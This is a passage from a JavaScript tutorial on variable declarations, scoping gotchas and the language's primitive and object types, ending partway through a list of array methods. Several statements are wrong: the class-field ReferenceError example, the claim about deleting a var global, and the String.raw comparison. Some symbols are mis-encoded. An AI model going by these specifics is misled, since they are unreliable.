**2. Destructuring:**

```javascript
// Prefer const
const { name, age } = user;
const [first, second] = arr;

// Use let if reassigning
let { count } = state;
count = count + 1;
```

**3. Conditional assignment:**

```javascript
let message;

if (condition) {
  message = 'yes';
} else {
  message = 'no';
}

// Better: use const with ternary
const message = condition ? 'yes' : 'no';
```

**4. Accumulation:**

```javascript
let sum = 0;
for (const num of numbers) {
  sum += num;
}

// Or use reduce
const sum = numbers.reduce((acc, num) => acc + num, 0);
```

**5. Configuration objects:**

```javascript
const config = {
  apiUrl: 'https://api.example.com',
  timeout: 5000,
  retries: 3
};

// Can mutate properties
config.timeout = 10000;

// Can't reassign
// config = {};  // TypeError
```

---

### 1.2.8 Edge Cases and Gotchas

### 1. Variable Shadowing

**Shadowing occurs when an inner scope declares a variable with the same name as an outer scope:**

```javascript
let x = 1;

{
  let x = 2;  // Shadows outer x
  console.log(x);  // 2
}

console.log(x);  // 1
```

**Shadowing is allowed across scopes:**

```javascript
let x = 1;

function f() {
  let x = 2;  // Shadows global x
  {
    let x = 3;  // Shadows function's x
    console.log(x);  // 3
  }
  console.log(x);  // 2
}

f();
console.log(x);  // 1
```

**But not in the same scope:**

```javascript
let x = 1;
let x = 2;  // SyntaxError
```

**Function parameters create bindings:**

```javascript
function f(x) {  // x is a parameter (binding)
  let x = 10;    // SyntaxError: x already declared
}

function g(x) {
  {
    let x = 10;  // OK: different scope
  }
}
```

---

### 2. Switch Statement Scope

**`switch` creates a single block scope for all cases:**

```javascript
switch (value) {
  case 1:
    let x = 10;  // Declared in switch block
    break;
  case 2:
    let x = 20;  // SyntaxError: x already declared
    break;
}
```

**Solution: Use explicit blocks:**

```javascript
switch (value) {
  case 1: {
    let x = 10;
    console.log(x);
    break;
  }
  case 2: {
    let x = 20;  // OK: different block
    console.log(x);
    break;
  }
}
```

---

### 3. Destructuring with `const`

**Each destructured binding is individually `const`:**

```javascript
const { x, y } = { x: 1, y: 2 };

x = 10;  // TypeError: Assignment to constant variable
y = 20;  // TypeError: Assignment to constant variable
```

**`undefined` values don't throw errors:**

```javascript
const { a, b } = { a: 1 };  // b is undefined, but no error
console.log(b);  // undefined (not ReferenceError)
```

**Default values:**

```javascript
const { a = 10, b = 20 } = { a: 1 };
console.log(a);  // 1
console.log(b);  // 20 (default)
```

---

### 4. Loop Variable Reassignment

**`for` loops with `const` in the loop body:**

```javascript
for (const item of arr) {
  // item is const, cannot reassign
  item = newValue;  // TypeError
}
```

**But new binding each iteration:**

```javascript
for (const item of ['a', 'b', 'c']) {
  // Each iteration has its own 'item' binding
  console.log(item);
}
// Output: a, b, c
```

**Traditional `for` loop:**

```javascript
// Cannot use const for counter (it needs to be reassigned)
for (const i = 0; i < 3; i++) {  // TypeError on i++
  console.log(i);
}

// Use let
for (let i = 0; i < 3; i++) {
  console.log(i);
}
```

---

### 5. TDZ and Class Methods

```javascript
class Example {
  method() {
    return this.value;
  }
  
  value = this.method();  // ReferenceError: Cannot access 'method' before initialization
}
```

**Why?**

Class fields are initialized in declaration order. `value` is initialized before `method` is available.

**Solution:**

```javascript
class Example {
  constructor() {
    this.value = this.method();  // OK: constructor runs after class is fully initialized
  }
  
  method() {
    return 42;
  }
}
```

---

### 6. Closure Capture with `var` vs `let`

**`var` captures reference to single variable:**

```javascript
var funcs = [];

for (var i = 0; i < 3; i++) {
  funcs.push(function() { return i; });
}

console.log(funcs[0]());  // 3
console.log(funcs[1]());  // 3
console.log(funcs[2]());  // 3
```

**`let` creates new binding per iteration:**

```javascript
var funcs = [];

for (let i = 0; i < 3; i++) {
  funcs.push(function() { return i; });
}

console.log(funcs[0]());  // 0
console.log(funcs[1]());  // 1
console.log(funcs[2]());  // 2
```

---

### 7. Global Object vs Global Lexical Environment

**`var` creates property on global object:**

```javascript
var x = 10;
console.log(window.x);  // 10 (browsers)

delete window.x;  // true (can delete)
console.log(x);   // ReferenceError
```

**`let`/`const` in global lexical environment:**

```javascript
let x = 10;
console.log(window.x);  // undefined

delete window.x;  // true (but meaningless)
console.log(x);   // 10 (still exists)
```

---

### 8. Const with Object Methods

**`const` only prevents reassignment, not mutation:**

```javascript
const obj = {
  count: 0,
  increment() {
    this.count++;  // OK: mutating object
  }
};

obj.increment();
console.log(obj.count);  // 1

obj = { count: 10 };  // TypeError: cannot reassign
```

---

### 1.2.9 Performance Considerations

### Variable Lookup Performance

**Block-scoped variables (`let`, `const`) are generally faster:**

Modern JavaScript engines optimize block-scoped variables better because their lifetime is more predictable.

**Scope chain traversal:**

```javascript
var globalVar = 1;

function outer() {
  var outerVar = 2;
  
  function inner() {
    var innerVar = 3;
    
    // Accessing variables requires scope chain traversal
    console.log(innerVar);   // Fast: local scope
    console.log(outerVar);   // Slower: traverse 1 level
    console.log(globalVar);  // Slowest: traverse 2 levels
  }
  
  inner();
}
```

**Minimize global access:**

```javascript
// Slow: repeated global access
for (let i = 0; i < 1000; i++) {
  console.log(Math.random());  // Math is global, accessed 1000 times
}

// Faster: cache global reference
const { random } = Math;
for (let i = 0; i < 1000; i++) {
  console.log(random());  // Local reference, faster
}
```

---

### TDZ Overhead

**TDZ checks have minimal overhead:**

Modern engines optimize TDZ checks efficiently. The performance cost is negligible compared to the correctness benefits.

---

### Memory Considerations

**Closures and memory:**

```javascript
function createCounter() {
  let count = 0;  // Memory allocated
  
  return {
    increment() { count++; },
    getCount() { return count; }
  };
}

const counter = createCounter();  // 'count' stays in memory (closure)
```

**`var` vs `let`/`const` memory:**

No significant difference in memory usage. Block-scoped variables may be garbage collected sooner when leaving scope, but this is engine-dependent and rarely matters in practice.

---

### 1.2.10 Summary

### Declaration Comparison Table

|Feature|`var`|`let`|`const`|
|---|---|---|---|
|**Scope**|Function|Block|Block|
|**Hoisting**|Yes, initialized|Yes, TDZ|Yes, TDZ|
|**Re-declaration**|Allowed|Not allowed|Not allowed|
|**Reassignment**|Allowed|Allowed|Not allowed|
|**Initialization required**|No|No|Yes|
|**TDZ**|No|Yes|Yes|
|**Global object property**|Yes|No|No|
|**Per-iteration binding**|No (single binding)|Yes (new each time)|Yes (new each time)|

---

### Key Takeaways

1. **`const` is the default choice**: Use unless reassignment is needed
2. **`let` for reassignment**: Loop counters, conditional assignments
3. **Never use `var`**: Except in legacy code maintenance
4. **TDZ catches errors early**: Forces proper declaration ordering
5. **Block scoping is clearer**: Variables exist only where needed
6. **Hoisting still applies**: But differently for `var` vs `let`/`const`
7. **`const` â‰  immutable value**: Only the binding is immutable
8. **`globalThis` for global access**: Works across all environments
9. **Minimize global variables**: Use modules or IIFE patterns
10. **Each loop iteration gets new bindings with `let`**: Solves closure problems

---

### Modern Best Practices

```javascript
// Default to const
const MAX_RETRIES = 3;
const config = { timeout: 5000 };
const users = [];

// Use let when reassignment needed
let count = 0;
for (let i = 0; i < 10; i++) {
  count += i;
}

// Avoid var entirely
// var x = 10;  // DON'T

// Use const in for-of/for-in
for (const user of users) {
  console.log(user);
}

// Object mutation is fine with const
config.timeout = 10000;
users.push({ id: 1 });

// Use Object.freeze() for immutability
const CONSTANTS = Object.freeze({
  API_URL: 'https://api.example.com'
});
```

---

## 1.3 Data Types

### 1.3.1 Primitive vs Reference Types

### Fundamental Distinction

**Primitives:**

- Immutable (cannot be changed)
- Stored by value
- Compared by value
- Seven types: `undefined`, `null`, `boolean`, `number`, `bigint`, `string`, `symbol`

**Reference Types:**

- Mutable (can be changed)
- Stored by reference
- Compared by reference (identity)
- Everything else: objects, arrays, functions, etc.

---

### Value vs Reference Semantics

**Primitives are copied:**

```javascript
let x = 10;
let y = x;  // y gets a COPY of the value
x = 20;

console.log(x);  // 20
console.log(y);  // 10 (unchanged)
```

**Reference types are referenced:**

```javascript
let obj1 = { count: 10 };
let obj2 = obj1;  // obj2 gets a REFERENCE to the same object
obj1.count = 20;

console.log(obj1.count);  // 20
console.log(obj2.count);  // 20 (same object)
```

**Memory model:**

```javascript
// Primitives
let a = 5;
let b = a;

// Memory:
// a â†’ [5]
// b â†’ [5]  (separate copy)

// References
let arr1 = [1, 2, 3];
let arr2 = arr1;

// Memory:
// arr1 â†’ [Reference: 0x1234]
// arr2 â†’ [Reference: 0x1234]
// 0x1234: [1, 2, 3]  (single object in heap)
```

---

### Immutability of Primitives

Primitives **cannot be mutated**. Operations on primitives always create new values:

```javascript
let str = "hello";
str.toUpperCase();  // Returns new string "HELLO"
console.log(str);   // Still "hello" (original unchanged)

let num = 5;
num++;             // Creates new value 6, assigns to num
// The original 5 is gone (or available for garbage collection)
```

**Why this matters:**

```javascript
let str = "test";
str[0] = "T";  // Silent failure (strict mode doesn't help)
console.log(str);  // Still "test"

// Strings are immutable - must create new string
str = "T" + str.slice(1);
console.log(str);  // "Test"
```

---

### 1.3.2 Primitive Types

### `undefined`

**Meaning:** Variable declared but not initialized, or property that doesn't exist.

**Type:** The type `undefined` has exactly one value: `undefined`.

**Characteristics:**

```javascript
let x;
console.log(x);           // undefined
console.log(typeof x);    // "undefined"

let obj = {};
console.log(obj.missing); // undefined

function f() {}
console.log(f());         // undefined (no explicit return)
```

**`undefined` is a global property:**

```javascript
console.log(window.undefined);     // undefined (browser)
console.log(globalThis.undefined); // undefined
```

**Can be shadowed (pre-ES5 bug, still possible in local scope):**

```javascript
// Global undefined cannot be reassigned (ES5+)
undefined = 42;
console.log(undefined);  // Still undefined

// But can be shadowed locally
function test() {
  let undefined = 42;  // Legal but terrible idea
  console.log(undefined);  // 42
}
```

**Safe check for `undefined`:**

```javascript
// Unsafe (can be shadowed)
if (x === undefined) { }

// Safe (typeof always works)
if (typeof x === "undefined") { }

// Safest (void always returns undefined)
if (x === void 0) { }
```

**`void` operator:**

```javascript
void 0;        // undefined
void(0);       // undefined
void anything; // undefined

// Common use: prevent default in href
<a href="javascript:void(0)">Click</a>
```

---

### `null`

**Meaning:** Intentional absence of value. Represents "no object."

**Type:** Despite `typeof null === "object"` (a bug in the spec), `null` is a primitive.

**Characteristics:**

```javascript
let x = null;
console.log(x);        // null
console.log(typeof x); // "object" (historical bug!)

console.log(x === null);     // true
console.log(x == undefined); // true (loose equality)
console.log(x === undefined);// false (strict equality)
```

**The `typeof null` bug:**

This is a **well-known bug** that cannot be fixed for backward compatibility reasons. In the original JavaScript implementation, values were stored with a type tag, and objects had a tag of `000`. `null` was represented as the NULL pointer (all zeros), which looked like an object tag.

**Checking for `null`:**

```javascript
if (x === null) { }         // Correct
if (x == null) { }          // Matches null OR undefined
if (!x && typeof x === "object") { }  // Explicit check
```

**`null` vs `undefined`:**

```javascript
// undefined: unintentional absence
let x;
console.log(x);  // undefined (forgot to initialize)

// null: intentional absence
let y = null;
console.log(y);  // null (explicitly set to "no value")

// API convention: null indicates "intentionally empty"
let user = getUserById(123);  // Returns null if not found
if (user === null) {
  console.log("User not found");
}
```

**Converting to primitive:**

```javascript
Number(null);      // 0
Number(undefined); // NaN

String(null);      // "null"
String(undefined); // "undefined"

Boolean(null);     // false
Boolean(undefined);// false
```

---

### `Boolean`

**Values:** `true` and `false` (only two values).

**Type:** `boolean`

**Characteristics:**

```javascript
let isTrue = true;
let isFalse = false;

console.log(typeof isTrue);  // "boolean"
console.log(typeof isFalse); // "boolean"
```

**Boolean conversion (all values are truthy or falsy):**

**Falsy values (8 total):**

```javascript
Boolean(false);      // false
Boolean(0);          // false
Boolean(-0);         // false
Boolean(0n);         // false (BigInt zero)
Boolean("");         // false (empty string)
Boolean(null);       // false
Boolean(undefined);  // false
Boolean(NaN);        // false
```

**Everything else is truthy:**

```javascript
Boolean(true);       // true
Boolean(1);          // true
Boolean(-1);         // true
Boolean("0");        // true (non-empty string)
Boolean("false");    // true (non-empty string)
Boolean([]);         // true (empty array is an object)
Boolean({});         // true (empty object)
Boolean(function(){}); // true
```

**Common gotcha:**

```javascript
let arr = [];
if (arr) {
  console.log("Arrays are truthy!");  // This runs
}

if (arr.length) {
  console.log("This doesn't run");  // length is 0 (falsy)
}
```

**Boolean constructor vs boolean primitive:**

```javascript
let primitiveBool = true;
let objectBool = new Boolean(true);

console.log(typeof primitiveBool);  // "boolean"
console.log(typeof objectBool);     // "object"

if (objectBool) {
  console.log("This runs!");  // Objects are always truthy, even Boolean(false)
}

let falseObject = new Boolean(false);
if (falseObject) {
  console.log("This runs too!");  // Object wrapper is truthy
}

// Always use primitives
```

---

### `Number`

**Range:** Â±1.7976931348623157 Ã— 10^308 (approximately)

**Type:** All numbers are 64-bit floating-point (IEEE 754 double precision).

**Characteristics:**

JavaScript has **no integer type**. All numbers are floats:

```javascript
let integer = 42;
let float = 42.5;
let scientific = 3.14e10;
let hex = 0xFF;        // 255
let octal = 0o77;      // 63
let binary = 0b1010;   // 10

console.log(typeof integer);  // "number"
console.log(typeof float);    // "number"
```

---

#### IEEE 754 Floating-Point

JavaScript uses **64-bit IEEE 754 double precision**:

**Binary representation:**

```
[Sign: 1 bit] [Exponent: 11 bits] [Mantissa/Fraction: 52 bits]
```

**Precision limits:**

```javascript
// Safe integer range: -(2^53 - 1) to (2^53 - 1)
Number.MAX_SAFE_INTEGER;  // 9007199254740991 (2^53 - 1)
Number.MIN_SAFE_INTEGER;  // -9007199254740991 (-(2^53 - 1))

// Beyond safe integers, precision is lost
console.log(9007199254740992);     // 9007199254740992
console.log(9007199254740993);     // 9007199254740992 (SAME!)
console.log(9007199254740994);     // 9007199254740994

// Checking safety
Number.isSafeInteger(9007199254740991);  // true
Number.isSafeInteger(9007199254740992);  // false
```

**Floating-point precision issues:**

```javascript
0.1 + 0.2;  // 0.30000000000000004 (NOT 0.3!)

// Why? 0.1 and 0.2 cannot be represented exactly in binary
// 0.1 in binary: 0.0001100110011001100110011... (infinite)
// 0.2 in binary: 0.001100110011001100110011... (infinite)

// Solutions:
// 1. Use epsilon comparison
Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON;  // true

// 2. Use integer arithmetic
(0.1 * 10 + 0.2 * 10) / 10;  // 0.3

// 3. Use libraries (e.g., decimal.js, big.js)

// 4. Use toFixed for display
(0.1 + 0.2).toFixed(2);  // "0.30"
```

**Special numeric values:**

```javascript
Number.MAX_VALUE;     // 1.7976931348623157e+308 (largest positive)
Number.MIN_VALUE;     // 5e-324 (smallest positive, close to zero)
Number.EPSILON;       // 2.220446049250313e-16 (smallest difference)
```

---

#### `NaN` (Not-a-Number)

**Type:** `number` (ironically)

**Characteristics:**

- Result of invalid numeric operations
- Only value that's not equal to itself
- Propagates through calculations

```javascript
console.log(typeof NaN);  // "number"

// Creating NaN
let result = 0 / 0;        // NaN
let invalid = parseInt("hello");  // NaN
let math = Math.sqrt(-1);  // NaN

// NaN is not equal to anything, including itself
console.log(NaN === NaN);  // false
console.log(NaN == NaN);   // false

// Checking for NaN
isNaN(NaN);        // true
isNaN("hello");    // true (coerces to NaN first, then checks)

Number.isNaN(NaN);        // true
Number.isNaN("hello");    // false (strict check, no coercion)

// Use Number.isNaN for accurate checking
```

**NaN propagation:**

```javascript
let x = NaN;
console.log(x + 5);   // NaN
console.log(x * 2);   // NaN
console.log(x - x);   // NaN (not 0!)
```

**Gotcha with `isNaN`:**

```javascript
isNaN("hello");     // true (coerces "hello" to NaN)
isNaN({});          // true (coerces {} to NaN)
isNaN(undefined);   // true (coerces undefined to NaN)

// Use Number.isNaN (ES6)
Number.isNaN("hello");     // false (no coercion)
Number.isNaN(NaN);         // true

// Polyfill for Number.isNaN
Number.isNaN = Number.isNaN || function(value) {
  return typeof value === "number" && isNaN(value);
};
```

---

#### `Infinity` and `-Infinity`

**Characteristics:**

```javascript
console.log(typeof Infinity);   // "number"
console.log(typeof -Infinity);  // "number"

// Creating Infinity
let positive = 1 / 0;         // Infinity
let negative = -1 / 0;        // -Infinity
let overflow = Number.MAX_VALUE * 2;  // Infinity

// Checking
Number.isFinite(Infinity);    // false
Number.isFinite(100);         // true
Number.isFinite(NaN);         // false

isFinite(Infinity);           // false
isFinite("100");              // true (coerces to number)
Number.isFinite("100");       // false (strict, no coercion)
```

**Math with Infinity:**

```javascript
Infinity + Infinity;    // Infinity
Infinity - Infinity;    // NaN
Infinity * Infinity;    // Infinity
Infinity / Infinity;    // NaN

Infinity + 100;         // Infinity
Infinity * 0;           // NaN

1 / Infinity;           // 0
-1 / Infinity;          // -0

// Comparisons
Infinity > 1000000;     // true
-Infinity < -1000000;   // true
```

---

#### Negative Zero (`-0`)

**Yes, JavaScript has negative zero:**

```javascript
let negZero = -0;
let posZero = 0;

console.log(negZero === posZero);  // true (equality ignores sign)
console.log(negZero);              // 0 (displayed as 0)

// Creating -0
let result = -1 / Infinity;  // -0
let math = Math.round(-0.1); // -0

// Detecting -0
function isNegativeZero(x) {
  return x === 0 && (1 / x) === -Infinity;
}

isNegativeZero(-0);  // true
isNegativeZero(0);   // false

// Object.is can distinguish
Object.is(0, -0);    // false
Object.is(-0, -0);   // true
```

**Why negative zero exists:**

IEEE 754 represents zero with a sign bit. This allows distinguishing direction in certain calculations:

```javascript
// Approaching zero from negative side
let x = -0.000001;
while (x !== 0) {
  x = x / 2;
}
console.log(1 / x);  // -Infinity (preserves direction)
```

---

#### Number Methods

```javascript
// Parsing
parseInt("123");        // 123
parseInt("123.45");     // 123
parseInt("FF", 16);     // 255 (hex)
parseFloat("123.45");   // 123.45

// Checking
Number.isInteger(42);       // true
Number.isInteger(42.5);     // false
Number.isNaN(NaN);          // true
Number.isFinite(100);       // true
Number.isSafeInteger(9007199254740991);  // true

// Conversion
(42).toString();        // "42"
(42).toString(2);       // "101010" (binary)
(42).toString(16);      // "2a" (hex)
(3.14159).toFixed(2);   // "3.14"
(3.14159).toPrecision(3);  // "3.14"
(1234).toExponential();    // "1.234e+3"
```

---

### `BigInt`

**Purpose:** Arbitrary-precision integers (no size limit).

**Type:** `bigint` (distinct from `number`)

**Syntax:**

```javascript
let big1 = 1234567890123456789012345678901234567890n;  // Literal: suffix with 'n'
let big2 = BigInt("1234567890123456789012345678901234567890");
let big3 = BigInt(123);  // From number

console.log(typeof big1);  // "bigint"
```

**No precision loss:**

```javascript
// Number loses precision
console.log(9007199254740993);     // 9007199254740992 (wrong!)

// BigInt preserves precision
console.log(9007199254740993n);    // 9007199254740993n (correct!)
```

**Arithmetic:**

```javascript
let a = 10n;
let b = 20n;

console.log(a + b);   // 30n
console.log(a * b);   // 200n
console.log(b / a);   // 2n (integer division, truncates)
console.log(b % a);   // 0n
console.log(a ** b);  // 100000000000000000000n

// Division truncates (no decimals)
console.log(7n / 2n);  // 3n (not 3.5)
```

**Cannot mix with Number:**

```javascript
let big = 10n;
let num = 20;

console.log(big + num);  // TypeError: Cannot mix BigInt and other types

// Must convert explicitly
console.log(big + BigInt(num));  // 30n
console.log(Number(big) + num);  // 30

// Caution: converting BigInt to Number may lose precision
let huge = 9007199254740993n;
console.log(Number(huge));  // 9007199254740992 (precision lost!)
```

**Comparisons:**

```javascript
// Equality (strict)
console.log(10n === 10);   // false (different types)
console.log(10n === 10n);  // true

// Equality (loose, coerces)
console.log(10n == 10);    // true

// Relational (works cross-type)
console.log(10n < 20);     // true
console.log(10n > 5);      // true
```

**No decimal, no exponential, no bitwise NOT:**

```javascript
let x = 10.5n;  // SyntaxError: invalid BigInt syntax
let y = 1e9n;   // SyntaxError: invalid BigInt syntax

~10n;  // TypeError: BigInt does not support bitwise NOT
// Other bitwise operators work fine
```

**Methods:**

```javascript
BigInt.asIntN(64, 2n ** 63n);   // Convert to signed 64-bit
BigInt.asUintN(64, 2n ** 64n);  // Convert to unsigned 64-bit

(123n).toString();     // "123"
(123n).toString(16);   // "7b" (hex)
```

---

### `String`

**Type:** Immutable sequence of UTF-16 code units.

**Characteristics:**

```javascript
let str1 = "double quotes";
let str2 = 'single quotes';
let str3 = `template literal`;

console.log(typeof str1);  // "string"
```

**Strings are immutable:**

```javascript
let str = "hello";
str[0] = "H";  // Silent failure
console.log(str);  // Still "hello"

// Must create new string
str = "H" + str.slice(1);
console.log(str);  // "Hello"
```

---

#### String Encoding (UTF-16)

JavaScript strings are sequences of **UTF-16 code units** (not characters!).

**Basic Multilingual Plane (BMP) characters (U+0000 to U+FFFF):**

Most common characters fit in a single code unit:

```javascript
let str = "A";  // U+0041
console.log(str.length);        // 1
console.log(str.charCodeAt(0)); // 65 (0x41)
```

**Supplementary characters (U+10000 to U+10FFFF):**

Characters outside BMP require **two code units** (surrogate pair):

```javascript
let emoji = "ðŸ˜€";  // U+1F600
console.log(emoji.length);        // 2 (surrogate pair!)
console.log(emoji.charCodeAt(0)); // 55357 (high surrogate)
console.log(emoji.charCodeAt(1)); // 56832 (low surrogate)

// Correct way to get code point
console.log(emoji.codePointAt(0));  // 128512 (0x1F600)
```

**Iterating strings correctly:**

```javascript
let str = "AðŸ˜€B";

// Wrong: iterates code units
for (let i = 0; i < str.length; i++) {
  console.log(str[i]);
}
// Output: A, ï¿½, ï¿½, B (surrogate pairs split)

// Correct: iterates code points
for (let char of str) {
  console.log(char);
}
// Output: A, ðŸ˜€, B

// Or use spread operator
console.log([...str]);  // ["A", "ðŸ˜€", "B"]

// Array.from also works
console.log(Array.from(str));  // ["A", "ðŸ˜€", "B"]
```

**Counting characters correctly:**

```javascript
let str = "AðŸ˜€B";
console.log(str.length);  // 4 (code units)

// Correct character count
console.log([...str].length);  // 3 (code points)
console.log(Array.from(str).length);  // 3
```

---

#### Template Literals

**Introduced in ES6:**

```javascript
let name = "Alice";
let age = 30;

// Template literal
let greeting = `Hello, ${name}! You are ${age} years old.`;
console.log(greeting);  // "Hello, Alice! You are 30 years old."

// Multi-line
let multiLine = `
  Line 1
  Line 2
  Line 3
`;

// Expressions
let math = `2 + 2 = ${2 + 2}`;  // "2 + 2 = 4"

// Function calls
let upper = `Hello ${name.toUpperCase()}!`;  // "Hello ALICE!"
```

**Tagged templates:**

```javascript
function tag(strings, ...values) {
  console.log(strings);  // ["Hello ", "! You are ", " years old."]
  console.log(values);   // ["Alice", 30]
  
  return strings[0] + values[0].toUpperCase() + strings[1] + values[1] + strings[2];
}

let result = tag`Hello ${name}! You are ${age} years old.`;
console.log(result);  // "Hello ALICE! You are 30 years old."
```

**Raw strings:**

```javascript
let path = String.raw`C:\Users\name\file.txt`;
console.log(path);  // "C:\Users\name\file.txt" (backslashes preserved)

// Without String.raw
let path2 = `C:\Users\name\file.txt`;
console.log(path2);  // "C:Usersame\file.txt" (\U and \n interpreted)
```

---

#### String Methods

```javascript
// Length and access
"hello".length;          // 5
"hello"[0];              // "h"
"hello".charAt(0);       // "h"
"hello".charCodeAt(0);   // 104
"ðŸ˜€".codePointAt(0);     // 128512

// Searching
"hello".indexOf("l");         // 2
"hello".lastIndexOf("l");     // 3
"hello".includes("ll");       // true
"hello".startsWith("he");     // true
"hello".endsWith("lo");       // true

// Extraction
"hello".slice(1, 4);          // "ell"
"hello".substring(1, 4);      // "ell"
"hello".substr(1, 3);         // "ell" (deprecated)

// Modification (returns new string)
"hello".toUpperCase();        // "HELLO"
"hello".toLowerCase();        // "hello"
"  hello  ".trim();           // "hello"
"  hello  ".trimStart();      // "hello  "
"  hello  ".trimEnd();        // "  hello"
"hello".repeat(3);            // "hellohellohello"
"hello".padStart(10, "*");    // "*****hello"
"hello".padEnd(10, "*");      // "hello*****"

// Replacement
"hello".replace("l", "L");    // "heLlo" (first occurrence)
"hello".replaceAll("l", "L"); // "heLLo" (all occurrences, ES2021)

// Splitting
"a,b,c".split(",");           // ["a", "b", "c"]
"hello".split("");            // ["h", "e", "l", "l", "o"]

// Concatenation
"hello".concat(" ", "world"); // "hello world"
"hello" + " " + "world";      // "hello world"
```

---

### `Symbol`

**Purpose:** Unique, immutable primitive for property keys.

**Type:** `symbol`

**Characteristics:**

- Every symbol is unique (even with same description)
- Immutable
- Not auto-converted to string
- Used as object property keys

**Creating symbols:**

```javascript
let sym1 = Symbol();
let sym2 = Symbol("description");
let sym3 = Symbol("description");

console.log(typeof sym1);  // "symbol"

console.log(sym2 === sym3);  // false (always unique!)

// Description is for debugging only
console.log(sym2.description);  // "description"
```

**Cannot convert to number or string implicitly:**

```javascript
let sym = Symbol("test");

console.log(sym + "");     // TypeError
console.log(+sym);         // TypeError

// Must be explicit
console.log(String(sym));  // "Symbol(test)"
console.log(sym.toString());  // "Symbol(test)"
```

**As property keys:**

```javascript
let sym = Symbol("id");

let obj = {
  [sym]: 123,
  name: "Alice"
};

console.log(obj[sym]);  // 123
console.log(obj.name);  // "Alice"

// Symbols are not enumerable in for-in
for (let key in obj) {
  console.log(key);  // Only "name"
}

// Symbols are not in Object.keys
console.log(Object.keys(obj));  // ["name"]

// Must use Object.getOwnPropertySymbols
console.log(Object.getOwnPropertySymbols(obj));  // [Symbol(id)]

// Or Reflect.ownKeys (gets all keys)
console.log(Reflect.ownKeys(obj));  // ["name", Symbol(id)]
```

**Well-known symbols:**

JavaScript has built-in symbols for customizing behavior:

```javascript
Symbol.iterator       // Customize iteration
Symbol.toStringTag    // Customize Object.prototype.toString
Symbol.hasInstance    // Customize instanceof
Symbol.toPrimitive    // Customize type conversion
Symbol.match          // Customize String.prototype.match
Symbol.species        // Customize derived constructors
// ... and more
```

**Example with `Symbol.iterator`:**

```javascript
let range = {
  from: 1,
  to: 5,
  
  [Symbol.iterator]() {
    let current = this.from;
    let last = this.to;
    
    return {
      next() {
        if (current <= last) {
          return { value: current++, done: false };
        } else {
          return { done: true };
        }
      }
    };
  }
};

for (let num of range) {
  console.log(num);  // 1, 2, 3, 4, 5
}

console.log([...range]);  // [1, 2, 3, 4, 5]
```

**Global symbol registry:**

```javascript
// Create or get global symbol
let sym1 = Symbol.for("shared");
let sym2 = Symbol.for("shared");

console.log(sym1 === sym2);  // true (same global symbol)

// Get key for global symbol
console.log(Symbol.keyFor(sym1));  // "shared"

// Local symbols not in registry
let local = Symbol("local");
console.log(Symbol.keyFor(local));  // undefined
```

---

### 1.3.3 Reference Types (Objects)

All reference types are objects. They're mutable and compared by reference.

### `Object`

**The base type for all objects:**

```javascript
let obj1 = {};  // Object literal
let obj2 = new Object();  // Constructor
let obj3 = Object.create(null);  // No prototype

console.log(typeof obj1);  // "object"
```

**Properties:**

```javascript
let user = {
  name: "Alice",
  age: 30,
  "full name": "Alice Smith",  // Key with space
  123: "numeric key"  // Numeric key (converted to string)
};

// Access
console.log(user.name);         // "Alice"
console.log(user["full name"]); // "Alice Smith"
console.log(user[123]);         // "numeric key"
console.log(user["123"]);       // "numeric key" (same)

// Add
user.email = "alice@example.com";

// Modify
user.age = 31;

// Delete
delete user.age;

// Check existence
console.log("name" in user);     // true
console.log(user.hasOwnProperty("name"));  // true
```

**Computed property names:**

```javascript
let propName = "dynamicKey";

let obj = {
  [propName]: "value",
  ["computed" + "Key"]: "value2"
};

console.log(obj.dynamicKey);   // "value"
console.log(obj.computedKey);  // "value2"
```

**Property shorthand:**

```javascript
let name = "Alice";
let age = 30;

// ES5
let user1 = { name: name, age: age };

// ES6 shorthand
let user2 = { name, age };
```

**Method shorthand:**

```javascript
// ES5
let obj1 = {
  method: function() {
    console.log("Hello");
  }
};

// ES6 shorthand
let obj2 = {
  method() {
    console.log("Hello");
  }
};
```

**Object methods:**

```javascript
// Keys and values
Object.keys(obj);     // ["key1", "key2", ...]
Object.values(obj);   // [value1, value2, ...]
Object.entries(obj);  // [["key1", value1], ["key2", value2], ...]

// Copying
Object.assign({}, obj);  // Shallow copy
{...obj};                // Spread (shallow copy)

// Freezing
Object.freeze(obj);      // Make immutable (shallow)
Object.seal(obj);        // Prevent add/delete, allow modify
Object.preventExtensions(obj);  // Prevent add only

// Checking
Object.isFrozen(obj);
Object.isSealed(obj);
Object.isExtensible(obj);

// Property descriptors
Object.getOwnPropertyDescriptor(obj, "key");
Object.defineProperty(obj, "key", descriptor);

// Prototype
Object.getPrototypeOf(obj);
Object.setPrototypeOf(obj, proto);
```

**Property descriptors:**

```javascript
let obj = {};

Object.defineProperty(obj, "name", {
  value: "Alice",
  writable: false,     // Cannot modify value
  enumerable: true,    // Shows in for-in
  configurable: false  // Cannot delete or reconfigure
});

obj.name = "Bob";  // Silent failure (strict mode: TypeError)
console.log(obj.name);  // Still "Alice"

delete obj.name;  // Silent failure
console.log(obj.name);  // Still "Alice"
```

---

### `Array`

**Ordered collection of elements:**

```javascript
let arr1 = [];  // Array literal
let arr2 = new Array();  // Constructor
let arr3 = [1, 2, 3];
let arr4 = new Array(5);  // Creates array with length 5 (empty slots)

console.log(typeof arr1);  // "object"
console.log(Array.isArray(arr1));  // true
```

**Length property:**

```javascript
let arr = [1, 2, 3];
console.log(arr.length);  // 3

// Length is writable
arr.length = 5;
console.log(arr);  // [1, 2, 3, empty Ã— 2]

arr.length = 2;
console.log(arr);  // [1, 2] (elements truncated!)
```

**Sparse arrays (holes):**

```javascript
let sparse = [1, , 3];  // Hole at index 1
console.log(sparse.length);  // 3
console.log(sparse[1]);      // undefined
console.log(1 in sparse);    // false (hole, not undefined value)

let dense = [1, undefined, 3];
console.log(2 in dense);     // true (explicit undefined)
```

**Array methods:**

```javascript
// Mutating (modify original array)
arr.push(item);       // Add to end
arr.pop();            // Remove from end
arr.unshift(item);    // Add to start
arr.shift();          // Remove from start
arr.splice(start, deleteCount, ...items);  // Add/remove at index
arr.reverse();        // Reverse in place
arr.sort();           // Sort in place
arr.fill(value);      // Fill with value

// Non-mutating (return new array)
arr.concat(arr2);     // Merge arrays
arr.slice(start, end);  // Extract subarray
arr.map(fn);          // Transform elements
arr.filter(fn);       // Filter elements
arr.reduce(fn, initial);  // Reduce to single value
arr.flat();           // Flatten nested arrays
arr.flatMap(fn);      // Map then flatten

// Searching
arr.indexOf(item);
arr.lastIndexOf(item);
arr.includes(item);
arr.find(fn);
arr.findIndex(fn);

// Iteration
arr.forEach(fn);
arr.some(fn);         // At least one passes test
arr.every(fn);        // All pass test

